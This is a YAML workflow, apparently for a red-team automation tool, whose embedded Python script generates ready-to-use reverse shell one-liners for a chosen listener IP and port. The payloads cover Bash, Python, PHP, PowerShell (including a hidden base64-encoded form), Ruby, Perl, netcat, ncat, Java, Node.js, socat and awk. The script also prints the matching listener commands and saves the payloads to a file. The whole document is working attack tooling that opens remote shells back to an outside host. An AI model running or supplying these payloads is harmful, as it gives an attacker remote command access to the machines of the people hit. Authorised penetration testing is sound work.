name: revshell-gen
description: |
  Reverse shell generator — generate reverse shell one-liners in
  Bash, Python, PHP, PowerShell, Ruby, Perl, Netcat, and more.
tags: [utility, reverse-shell, exploit, redteam]
dispatch:
  inputs:
    lhost:
      required: true
      type: string
      description: Listener IP address
    lport:
      type: string
      default: '4444'
      description: Listener port
    shell_type:
      type: string
      default: all
      description: |
        Shell type: bash, python, php, powershell, ruby, perl, netcat,
        java, nodejs, all

jobs:
  generate:
    name: Generate Reverse Shells
    steps:
    - name: gen-shells
      script: |
        lhost = '{{ inputs.lhost }}'
        lport = '{{ inputs.lport }}'
        shell_type = '{{ inputs.shell_type }}'

        shells = {}

        shells['bash_tcp'] = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        shells['bash_udp'] = f"bash -i >& /dev/udp/{lhost}/{lport} 0>&1"
        shells['bash_mkfifo'] = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"

        shells['python'] = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        shells['python_short'] = f"python3 -c 'import os;os.system(\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\")'"

        shells['php'] = f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        shells['php_exec'] = f"php -r '$sock=fsockopen(\"{lhost}\",{lport});$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"

        import base64
        ps_payload = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        ps_b64 = base64.b64encode(ps_payload.encode('utf-16-le')).decode()
        shells['powershell'] = f"powershell -nop -w hidden -enc {ps_b64}"
        shells['powershell_plain'] = ps_payload

        shells['ruby'] = f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        shells['perl'] = f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'"

        shells['nc_e'] = f"nc -e /bin/sh {lhost} {lport}"
        shells['nc_mkfifo'] = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        shells['ncat_ssl'] = f"ncat --ssl {lhost} {lport} -e /bin/sh"

        shells['java'] = f"Runtime.getRuntime().exec(new String[]{{\"bash\",\"-c\",\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"}});"
        shells['nodejs'] = f"require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')"
        shells['socat'] = f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
        shells['awk'] = f"awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}'"

        # Select output
        if shell_type == 'all':
            selected = shells
        else:
            selected = {k: v for k, v in shells.items() if k.startswith(shell_type)}
            if not selected:
                selected = shells

        print(f"=== REVERSE SHELLS ({lhost}:{lport}) ===\n")
        for name, cmd in selected.items():
            print(f"--- {name} ---")
            print(cmd)
            print()

        # Listener commands
        print("=== LISTENERS ===")
        print(f"  nc:    nc -lvnp {lport}")
        print(f"  ncat:  ncat --ssl -lvnp {lport}")
        print(f"  socat: socat file:`tty`,raw,echo=0 tcp-listen:{lport}")
        print(f"  rlwrap: rlwrap nc -lvnp {lport}")

        from pathlib import Path
        out = '/tmp/ofx_revshells.txt'
        with open(out, 'w') as f:
            for name, cmd in shells.items():
                f.write(f"=== {name} ===\n{cmd}\n\n")

        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
            f.write(f"shells_file={out}\n")
            f.write(f"shell_count={len(shells)}\n")
      log-stdout: true
